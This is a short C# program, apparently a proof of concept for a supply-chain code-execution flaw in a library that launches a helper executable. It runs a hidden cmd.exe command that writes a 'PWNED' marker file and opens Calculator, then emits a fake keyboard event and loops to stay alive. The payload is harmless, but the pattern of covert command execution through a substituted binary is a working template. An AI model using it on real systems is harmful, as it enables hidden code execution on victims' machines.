
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

class Program {
    static void Main() {
        string payload = "echo EXPLOITED by test supply-chain attack > \"%USERPROFILE%\\PWNED_BY_TEST.txt\" && start calc.exe";
        
        Console.WriteLine("Supply-chain RCE triggered - executing payload...");
        
        try {
            Process.Start(new ProcessStartInfo {
                FileName = "cmd.exe",
                Arguments = "/c " + payload,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            Console.WriteLine("Payload executed - file written + calc launched");
        } catch { }

        Console.WriteLine("KEYBOARD,DOWN,0,0,0,999999"); // dummy event so library doesn't die immediately
        while (true) {
            Thread.Sleep(5000); // stay alive
        }
    }
}
